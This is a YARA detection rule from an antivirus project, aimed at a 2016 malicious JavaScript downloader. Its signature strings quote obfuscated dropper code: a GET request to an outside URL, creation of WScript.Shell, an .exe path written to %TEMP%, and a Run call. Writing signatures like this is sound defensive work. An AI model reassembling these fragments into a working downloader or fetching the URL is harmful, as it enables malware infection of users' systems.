rule sig_20160330_d74d95b0701cade4f6877ffba93d4352 {
  meta:
    description = "datamaliciousorder - file 20160330_d74d95b0701cade4f6877ffba93d4352.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2ed020464257e6b7a338a1f467f908e79a9b2bc7cf96fcbadf034cb8cbf0da71"

  strings:
    $s1  = "WC[F0](\"GET\", \"http://buygrocery.nz/l7dsp\", false);" fullword ascii
    $s2  = "var EU = function RD() {return WScript[ZD](\"WScript\"+\".Shell\");}(), K = 11;" fullword ascii
    $s3  = "function F(UH, AM){R = R * 1; return UH - AM;};" fullword ascii
    $s4  = "if (WC[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function T(){return N1 + \"\";};" fullword ascii
    $s6  = "function OI() {return EU[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"x5WduBU02Vb1.ex\" + \"e\";};" fullword ascii
    $s7  = "function WN() {return ((C == true) && (C == HT)) ? 1 : R;};" fullword ascii
    $s8  = "function Z(EJ){EU[\"Run\"](EJ, R, R);};" fullword ascii
    $s9  = "function U(){return 22;};" fullword ascii
    $s10 = "}while (H);" fullword ascii
    $s11 = "var U1 = new this[\"Date\"]();" fullword ascii
    $s12 = "function N(U0) {var KF = (1, 2, 3, 4, 5, U0); return KF;};" fullword ascii
    $s13 = "function N0()" fullword ascii
    $s14 = "return F(AJ, T0);" fullword ascii
    $s15 = "function A(){return ZD;};" fullword ascii
    $s16 = "var C = false;" fullword ascii
    $s17 = "C = true; " fullword ascii
    $s18 = "var T1 = false;" fullword ascii
    $s19 = "HT = true; " fullword ascii
    $s20 = "var HT = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}